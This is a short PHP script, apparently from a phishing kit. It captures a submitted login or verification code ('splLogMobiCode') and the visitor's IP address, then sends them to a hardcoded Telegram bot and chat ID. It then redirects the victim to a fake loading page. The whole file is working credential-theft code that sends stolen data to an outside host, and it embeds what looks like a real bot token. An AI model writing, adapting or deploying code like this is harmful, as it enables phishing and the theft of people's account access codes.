<?php
$IP = getenv("REMOTE_ADDR");
$message .= "--++-----[spl  code]-----++--\n";

$message .= "code : ".$_POST['splLogMobiCode']."\n";


$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "---------- k2B -----------\n";

$subject = "sa Post [ " . $IP . " ] ";



$token = "5357908787:AAHrBCvJMCymaIQlHOokpOyCos_TtO1P48U";
$data = [
    'text' => $message,
    'chat_id' => '5351288466'
];

file_get_contents("https://api.telegram.org/bot5357908787:AAHrBCvJMCymaIQlHOokpOyCos_TtO1P48U/sendMessage?" . http_build_query($data) );

header("Location: loading2.html");
?>